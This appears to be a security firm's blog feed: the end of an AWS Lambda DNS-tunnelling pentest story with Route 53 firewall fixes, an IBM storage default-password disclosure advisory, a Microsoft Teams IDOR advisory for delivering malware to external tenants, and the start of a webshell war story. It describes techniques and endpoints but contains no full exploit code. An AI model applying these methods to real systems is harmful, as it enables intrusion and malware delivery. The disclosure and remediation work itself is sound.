    &lt;img src=&#34;images/pic16.png&#34; title=&#34;pic16&#34; alt=&#34;pic16&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic16&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Running &lt;code&gt;sts get-caller-identity&lt;/code&gt;, the &lt;code&gt;whoami&lt;/code&gt; for aws cli, we can see that the authentication as the lambda was successful.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic17.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;Then comes the somewhat anticlimatic end to the engagement. With bruteforcing cloud resources that the Lambda&amp;rsquo;s identity could access, I found that everything returned empty except the IP ranges used, which honestly wasn&amp;rsquo;t much. There were some other attack vectors pertaining the Lambda angle, such as the &lt;code&gt;/invocation/next&lt;/code&gt; endpoint and so on, but avenues to further lateral movement and escalation within the AWS tenant appeared to be limited.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic18.png&#34; title=&#34;pic18&#34; alt=&#34;pic18&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic18&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;h3&gt;Epilogue - Investigations on AWS&lt;span class=&#34;absolute -mt-20&#34; id=&#34;epilogue---investigations-on-aws&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#epilogue---investigations-on-aws&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Throughout the testing of this application I was in constant back-and-forth communications with the client to keep them up to date with my findings, and potential ways to remediate the vulnerabilities discovered. All in all, they were quite glad that we have discovered issues of this magnitude, and were shocked that the application could talk to the outside world via DNS when they supposedly &amp;ldquo;blocked everything&amp;rdquo;. In the report I suggested to look into built-in cloud DNS capabilities and blocking ports alone might not be enough to stop an &amp;ldquo;air gapped&amp;rdquo; cloud app from DNS tunnelling, especially the server-less kinds. (Think Lambda for AWS, or PowerApp for Azure).&lt;/p&gt;
&lt;p&gt;After delivering the report I couldn&amp;rsquo;t stop thinking about this remediation bit because:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;I thought it should be possible to configure that capacity, but I&amp;rsquo;m not 100% sure how to. So if I deployed a Lambda myself, I wasn&amp;rsquo;t sure yet how it should be secured against this attack (besides not having an RCE, phew!).&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Or … what if there wasn&amp;rsquo;t an AWS native thing you could just enable and call it a day? Could I have just found a CVE on AWS Lambda itself?&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So the lingering thought drove me to spin up my own Lambda which executed plain old Python 3.11. I set up the Network Security Group to block 0.0.0.0/0 on all the TCP and UDP ports, and gave it a go. Voila, the same issue, DNS tunnelling through and querying my Burp Collaborator. Okay, first step done. How to close it off?&lt;/p&gt;
&lt;p&gt;I searched around for a bit for strings like &amp;ldquo;DNS Firewall&amp;rdquo; within AWS and on Google. Soon I found this: &amp;ldquo;Route 53 Resolver DNS Firewall&amp;rdquo;, a billable service … that blocks port 53 after you have blocked port 53. I was like &amp;ldquo;of course Jeff, I knew you&amp;rsquo;d do this to us…&amp;rdquo;.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic19.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;To keep the setup description short, what you need to do is to create a rule group first. In configurations, as I needed a blanket block I defined a rule to block absolutely everything, then click add rule. If you need some DNS resolution for your internal domains, you could define a custom allowlist.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic20.png&#34; title=&#34;pic17&#34; alt=&#34;pic17&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic17&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;After the rules are sorted, associate the rule group with a VPC that contains your application or VM, and it&amp;rsquo;s all done! The Lambda was no longer querying random DNS servers for arbitrary domains.&lt;/p&gt;
&lt;p&gt;I hope you&amp;rsquo;ve enjoyed this rather convoluted story about how an app test turned into me trying to implement a custom DNS tunnelling protocol not dissimilar to what you&amp;rsquo;d see on C2 frameworks, just minus the encryption, stealth and redundancy bits. And then we investigated some obscure functionality invented by AWS to add to your cloud bill and block the same thing twice.&lt;/p&gt;
&lt;p&gt;The client definitely found it a very cool story during our debrief and allowed me to publish it, so although we&amp;rsquo;re not gonna name names, thank you unnamed client! And thank you, the reader for making it to the end.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</link>
      <pubDate>Thu, 21 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; 8.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.ibm.com/support/pages/node/7064976&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.ibm.com/support/pages/node/7064976&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-43042&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 08/12/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.0 Score:&lt;/strong&gt; 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Max Corbridge&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC’s Head of Adversarial Simulation (&lt;a href=&#34;https://twitter.com/CorbridgeMax&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@CorbridgeMax&lt;/a&gt;) discovered that an unauthenticated user can determine whether the default superuser password has been changed on IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products. These products were found to be a single point of failure for backup and disaster recovery processes within client environments, and as such are highly critical systems. &lt;/p&gt;
&lt;p&gt;This only affects the 8.3.1 release as it is impossible for the default password to still be configured on an active system running later releases, since the user must change this either as part of first time setup or prior to upgrading from 8.3.1 or earlier. However, IBM has removed the ability to query this status from all releases listed in the Mitigation section of this advisory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IBM web servers related to backup/storage products respond to unauthenticated GET requests to the &lt;em&gt;/login&lt;/em&gt; page with the name of the superuser account and if the default password has been changed or not. This could allow unauthenticated attackers on the network with the necessary information to compromise what is often a business-critical asset, with superuser permissions. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 
Cache-Control: no-cache, no-store, must-revalidate
Strict-Transport-Security: max-age=778000; includeSubDomains
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Pragma: no-cache
X-Content-Type-Options: nosniff
SET-COOKIE: JSESSIONID=[REDACTED];Path=/;Secure;SameSite=Lax
SET-COOKIE: _sync=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _redirect=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _sync=[REDACTED]; HttpOnly; Secure
X-FRAME-OPTIONS: DENY
Cache-Control: post-check=0, pre-check=0
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Fri, 08 Sep 2023 12:28:27 GMT
Connection: close
Content-Length: 70858



&amp;lt;!DOCTYPE html&amp;gt;

&amp;lt;html&amp;gt;
[SNIPPED_FOR_BREVITY]
&amp;#34;superuserPasswordChanged&amp;#34;:true,&amp;#34;hasEnvironmentals&amp;#34;:true,
[SNIPPED_FOR_BREVITY]
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Figure 1: HTTP Response from IBM FlashSystem Webserver&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a priority, change the superuser password if it is still set to the default.&lt;/p&gt;
&lt;p&gt;IBM also recommends that you fix this vulnerability by upgrading affected versions of IBM SAN Volume Controller, IBM Storwize V7000, IBM Storwize V5000 and V5100, IBM Storwize V5000E, IBM Spectrum Virtualize Software, IBM Spectrum Virtualize for Public Cloud, IBM FlashSystem V9000, IBM FlashSystem 9500, IBM FlashSystem 9100 Family, IBM FlashSystem 9200, IBM FlashSystem 7300, IBM FlashSystem 7200, IBM FlashSystem 5200 and IBM FlashSystem 5000 to the following code levels or higher:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.2.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.0.2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.5.0.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.4.0.12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.3.1.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Please note that it is necessary to change the superuser password before upgrading from 8.3.1 to 8.4.0 or later, which is the reason why this upgrade remediates the vulnerability.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;08/09/2023: Vulnerability submitted through IBM’s Vulnerability Disclosure Program&lt;/p&gt;
&lt;p&gt;13/12/2023: Vulnerability remediated and public notice created by IBM.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Advisory: IDOR in Microsoft Teams Allows for External Tenants to Introduce Malware</title>
      <link>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</link>
      <pubDate>Wed, 21 Jun 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/06/2023-06-21-advisory-idor-in-microsoft-teams-allows-for-external-tenants-to-introduce-malware/</guid>
      <description>
        
        
        &lt;h3&gt;&lt;strong&gt;TL;DR&lt;/strong&gt;&lt;span class=&#34;absolute -mt-20&#34; id=&#34;tldr&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#tldr&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Max Corbridge (@CorbridgeMax) and Tom Ellson (@tde_sec) of JUMPSEC’s Red Team recently discovered a vulnerability in the latest version of Microsoft Teams which allows for the possible introduction of malware into any organisations using Microsoft Teams in its default configuration. This is done by bypassing client-side security controls which prevent external tenants from sending files (malware in this case) to staff in your organisation. JUMPSEC has detailed remediation options, as well as some detection opportunities. &lt;/p&gt;
&lt;h3&gt;Introduction&lt;span class=&#34;absolute -mt-20&#34; id=&#34;introduction&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#introduction&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Introducing malware into target organisations is becoming increasingly difficult. Many of the traditional payload types (.exe, Office Macros, etc) are now heavily-scrutinised or have been proactively addressed to reduce their &lt;a href=&#34;https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;efficacy&lt;/em&gt;&lt;/a&gt;. Similarly, payload delivery avenues such as phishing are becoming increasingly monitored and secured to reduce the ease with which threat actors’ malware can reach end-user devices. Mail security controls, IP blocklists, domain reputation, email HTML, content inspection, third-party mail security products, URL filtering and many more must be bypassed for a phishing campaign to traverse all anti-phishing security controls and land in a target’s inbox. &lt;/p&gt;
&lt;p&gt;As such, threat actors and red teams alike are looking for newer and potentially overlooked avenues of payload delivery. One such novel avenue is Microsoft Teams External Tenants. Organisations that use Microsoft Teams (91% of the Fortune 100 according to &lt;a href=&#34;https://www.linkedin.com/pulse/91-fortune-100-companies-use-teams-techbanditshack&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;this article&lt;/em&gt;&lt;/a&gt;) inherit Microsoft’s default configuration which allows users from outside of their organisation to reach out to their staff members. By allowing this, an entirely new avenue of social engineering (and now payload delivery as this blog will explain) is created.&lt;/p&gt;
&lt;h3&gt;Detail&lt;span class=&#34;absolute -mt-20&#34; id=&#34;detail&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#detail&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Microsoft Teams allows any user with a Microsoft account to reach out to ‘external tenancies’. Here, external tenancies can be thought of as any business or organisation using Microsoft Teams. These organisations each have their own Microsoft tenancy, and users from one tenancy are able to send messages to users in another tenancy. When doing so, an ‘External’ banner appears alongside the name as seen below. &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19671&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;391&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/external.png&#34; title=&#34;External banner on incoming message&#34; alt=&#34;&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;External banner on incoming message&lt;/figcaption&gt;
  &lt;/figure&gt; External banner applied to incoming message requests[/caption]&lt;/p&gt;
&lt;p&gt;As someone who spent a long time doing purely social engineering (phishing, vishing, smshing, etc.) this is not a show stopper by any means. In my experience, whilst this banner (and the subsequent pop-up) may deter a handful of targets, there is still a significant percentage of staff that would click on a message from an external tenant and accept the subsequent warning that the user is ‘external’. In fact, this was proven only last month, as the techniques used in this blog post were successfully used to gain an initial foothold in a client’s environment as part of a red team engagement. This is especially true if the malicious party is impersonating a known member of your organisation, and has purchased and registered a brand-impersonation domain as red teams often do.&lt;/p&gt;
&lt;p&gt;When messaging staff in another organisation you are blocked from sending files to them, unlike with members of your own tenancy. See below the difference:&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19672&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1496&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Messaging a member of the same organisation&#34; alt=&#34;Messaging a member of the same organisation &#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Messaging a member of the same organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Messaging a member of the same organisation[/caption]&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19673&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1421&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/2.png&#34; title=&#34;Restrictions when messaging someone in a different organisation&#34; alt=&#34;Restrictions when messaging someone in a different organisation&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Restrictions when messaging someone in a different organisation&lt;/figcaption&gt;
  &lt;/figure&gt; Restrictions when messaging someone in a different organisation[/caption]&lt;/p&gt;
&lt;p&gt;So far, this is nothing new. However, having leveraged this social engineering avenue in the past I began wondering if this security control could be bypassed to allow for seamless delivery of payloads directly into a target&amp;rsquo;s inbox on our red team engagements. I began looking online, and articles &lt;a href=&#34;https://aadinternals.com/post/teams-policies/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;&lt;em&gt;like this&lt;/em&gt;&lt;/a&gt; suggested that certain security controls are actually implemented client-side in Microsoft Teams.&lt;/p&gt;
&lt;p&gt;I raised this with JUMPSEC’s Head of Offensive Security (Tom Ellson) and no more than 10 minutes later we had bypassed the security control and were able to send files into a target organisation. Exploitation of the vulnerability was straightforward using a traditional IDOR technique of switching the internal and external recipient ID on the POST request, usually here:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;/v1/users/ME/conversations/&amp;lt;RECIPIENT_ID&amp;gt;/messages &lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19674&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;1429&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/3.png&#34; title=&#34;3&#34; alt=&#34;3&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;3&lt;/figcaption&gt;
  &lt;/figure&gt; Payload delivered directly into a target inbox[/caption]&lt;/p&gt;
&lt;p&gt;When sending the payload like this, it is actually hosted on a Sharepoint domain and the target downloads it from there. It appears, however, in the target inbox as a file, not a link. &lt;/p&gt;
&lt;p&gt;Having identified the issue, I wanted to validate that this vulnerability would work as intended as an avenue for payload delivery into a target organisation, and not fall short for some unknown reason when used in a mature client environment. As such, last month I used this vulnerability to deliver our red team C2 (malware) payload directly into a target inbox to gain our initial foothold on a covert red team engagement. This allowed for a much more simple, reliable, and user-friendly payload delivery avenue than traditional phishing journeys. &lt;/p&gt;
&lt;h3&gt;Why is this a big deal?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;why-is-this-a-big-deal&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#why-is-this-a-big-deal&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The true reason I see this to be a potentially lucrative avenue for threat actors to deliver payloads is the fact that this bypasses nearly all modern anti-phishing security controls mentioned in the introduction of this advisory. &lt;/p&gt;
&lt;p&gt;Firstly, it is very straightforward to buy a domain similar to your target organisations and register it with M365. It avoids the need to use mature domains, with web servers, landing pages, CAPTCHAs, domain categorisation, and URL filtering. This is a huge time saver, as this can cost several days or more on a red team engagement when setting up the various bits of infrastructure needed for a convincing phishing campaign. &lt;/p&gt;
&lt;p&gt;Secondly, it avoids the now-rightfully-dangerous act of clicking on a link in an email, something that staff have been trained to avoid for years now, greatly reducing the likelihood of a typical staff member detecting this as a phishing attack. The payload will now be served by a trusted Sharepoint domain, and will arrive in the form of a file in a target’s Teams inbox. As such, the payload inherits the trust reputation of Sharepoint, not a malicious phishing website.&lt;/p&gt;
&lt;p&gt;Finally, when this vulnerability is combined with social engineering via Teams it becomes very easy to start a back-and-forth conversation, jump on a call, share screens, and more. By comparison, it makes social engineering via email feel very stagnant, and stop-start. When using this on a real engagement the pretext of an IT technician was used to ask the target if they could jump on a call to update some critical software. Once on the call this vulnerability was leveraged to deliver a payload and, when combined with a full social engineering attack, was implicitly trusted by the target. &lt;/p&gt;
&lt;h3&gt;Impact&lt;span class=&#34;absolute -mt-20&#34; id=&#34;impact&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#impact&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability affects every organisation using Teams in the default configuration. As such it has huge potential reach, and could be leveraged by threat actors to bypass many traditional payload delivery security controls. Having now proven this hypothesis, and used this vulnerability to successfully deliver malware that compromised a target machine in a client&amp;rsquo;s environment, I feel this has been successfully demonstrated as an exploitable finding.&lt;/p&gt;
&lt;h3&gt;Remediation and Detection&lt;span class=&#34;absolute -mt-20&#34; id=&#34;remediation-and-detection&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#remediation-and-detection&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This vulnerability was reported to Microsoft, who validated that the vulnerability is legitimate, but said that it ‘did not meet the bar for immediate servicing’. I think this is a shame, but was nonetheless expected. As such, JUMPSEC has added this section to help organisations who might be concerned about the above findings. &lt;/p&gt;
&lt;p&gt;Firstly, I urge you to review if there is a business requirement for external tenants to have permission to message your staff in the first place. Of course, many businesses do legitimately require communication with other organisations, service providers, and more. That is not the case, however, for all businesses that use Teams. If you are not currently using Teams for regular communication with external tenants, tighten up your security controls and remove the option altogether. This can be done in Microsoft Teams Admin Center &amp;gt; External Access.&lt;/p&gt;
&lt;p&gt;If you do require communication with external tenants, but there are only a handful of organisations that you regularly communicate with, then you can change the security settings to only allow communication with certain allow-listed domains. This would be a good middle ground for shutting down this attack path, without affecting your business operations. This can be done in Microsoft Teams Admin Center &amp;gt; External Access. &lt;/p&gt;
&lt;p&gt;If either of the above will not work in your unique business case you have a few options. Firstly, endeavour to educate staff on the possibility of productivity apps such as Teams, Slack, Sharepoint, etc, for launching social engineering campaigns. It is not just email that is being abused any more, and yet it seems, in my personal opinion, that when using alternative avenues to email there is an inherent trust, due to the rich history connecting phishing and emails. &lt;/p&gt;
&lt;p&gt;Regarding detections, there is currently limited support from Microsoft. Whilst there are plenty of Teams logs (see here for a full list &lt;a href=&#34;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://learn.microsoft.com/en-us/microsoft-365/compliance/audit-teams-audit-log-events?view=o365-worldwide&lt;/a&gt;) these do not currently cover the crucial ‘External Tenants Messaging your Staff’, or even better ‘Staff Member Accepts Message Request from External Tenant’. The latter would be preferable, as it would eliminate alerts from previously-known external tenants (your service providers, etc) and focus just on new message requests. I have reached out to Microsoft to attempt to turn on these logs so that they can be monitored in line with the increased usage of Teams for social engineering. If you agree that this should be made available, then please give the feature request a thumbs up (&lt;a href=&#34;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://feedbackportal.microsoft.com/feedback/idea/16fe3111-4410-ee11-a81c-000d3a7a48db&lt;/a&gt;)&lt;/p&gt;
&lt;p&gt;Whilst not a perfect solution, it would be possible to use web proxy logs to alert on, or more likely gain some baseline visibility into, staff members accepting external message requests. In EMEA, when a Teams user accepts a message request from an external tenant it sends a POST request to a unique URI which you can monitor:&lt;/p&gt;
&lt;p&gt;/api/mt/emea/beta/userSettings/acceptlist/manage&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19675&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;947&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/request_clean.png&#34; title=&#34;request clean&#34; alt=&#34;request clean&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;request clean&lt;/figcaption&gt;
  &lt;/figure&gt; URI for accepting external message requests[/caption]&lt;/p&gt;
&lt;p&gt;The difficulty, at present, is turning this into a useful piece of telemetry with usernames, and the message in question. Monitoring this will, however, give you an idea of how common this transaction is in your estate, and allow you to potentially implement some of the mitigation factors mentioned above with a more educated understanding. &lt;/p&gt;
&lt;h3&gt;Conclusion&lt;span class=&#34;absolute -mt-20&#34; id=&#34;conclusion&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#conclusion&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;As a Red Teamer regularly tasked with achieving an initial foothold in a target organisation, I have a unique appreciation and concern for the above-mentioned finding. With over 270 million active monthly users, Teams is incredibly common in target organisations. JUMPSEC’s Detection and Response Team (DART) have seen a trend towards novel phishing and payload delivery techniques leveraged in the wild, including but not limited to using Teams external tenancies for social engineering. With threat actors continually experimenting with new social engineering attacks, organisations are having to expand their security awareness to cover previously-overlooked frontiers.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Butting Heads with a Threat Actor on an Engagement</title>
      <link>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</link>
      <pubDate>Mon, 17 Apr 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/04/2023-04-17-butting-heads-with-a-threat-actor-on-an-engagement/</guid>
      <description>
        
        
        &lt;p&gt;At the time of writing I am enjoying some non-billable time in the wake of a demanding engagement spanning across several months. As such, I thought it would be a good time to write up a war story from a recent project in which we came head to head against genuine and active threat actors whilst on an engagement.&lt;/p&gt;
&lt;p&gt;To set the scene, I am working on a purple team project in which we are to cover both the external and internal estate. This tale comes from the external portion of the engagement and as such my colleague and I are going about our usual external red team attack methodology. During this external phase we identify several instances of servers running a software that will remain unnamed for confidentiality’s sake. I will say that this was a third-party software that is used for Identity Access Management, and it appeared to be used in several environments (pre-prod, production, etc) within the client’s estate.&lt;/p&gt;
&lt;p&gt;We fingerprint the exact version of the technology in-use and find that it is in fact vulnerable and outdated. Specifically, it is vulnerable to an unrestricted file upload vulnerability. As is so often the case, metasploit had created a module for the automated exploitation of this vulnerability - great news! As this is not a covert red team, and therefore getting detected is not an issue, I attempt to exploit the file upload vulnerability using meterpreter and msfvenom. Alas, the exploit fails. Undeterred, I look to manually verify the vulnerability myself as I so often find myself doing when metasploit fails me.&lt;/p&gt;
&lt;p&gt;I find a proof-of-concept script on Github and read through the code. It looks good so I quickly write (steal) a JSP webshell to accompany the script and point the pair at my client’s vulnerable servers. This time, it works. With what feels like ‘too good to be true’ ease I’ve got remote code execution on the production Single Sign On (SSO) and Identity Access Management (IAM) server! As always in these cases I let the client know immediately before digging a little bit deeper.&lt;/p&gt;
&lt;p&gt;When landing on an unknown machine I want to immediately perform some situational awareness. From an external perspective this may look slightly different to internal. Some of the main questions include: What OS/distribution am I using? What user and permissions do I have? Am I domain-joined? Do I have visibility into the internal network?&lt;/p&gt;
&lt;p&gt;I quickly determine these answers and find that I am running as a low-privileged user, on a unix machine, that is not domain-joined. Not as juicy as I originally thought, but this is still the production SSO and IAM box so I am hopeful. At this point I get my first inclination that maybe such a trivial exploit chain may have already been abused. I run an &lt;em&gt;ls&lt;/em&gt; to look for the existence of other webshells beyond just my own.&lt;/p&gt;
&lt;p&gt;[caption id=&amp;ldquo;attachment_19445&amp;rdquo; align=&amp;ldquo;aligncenter&amp;rdquo; width=&amp;ldquo;663&amp;rdquo;]&lt;figure&gt;
    &lt;img src=&#34;images/1.png&#34; title=&#34;Figure 1&#34; alt=&#34;Output of ’ls’ command&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;Figure 1&lt;/figcaption&gt;
  &lt;/figure&gt; Output of &amp;rsquo;ls&amp;rsquo; command[/caption]&lt;/p&gt;
&lt;p&gt;As you can see it appears that I am in the site root of the server. However, what I do not see is the name of my own webshell (cmd.jsp) meaning that my file must not have been uploaded to the site root, more likely it is in the webroot.&lt;/p&gt;
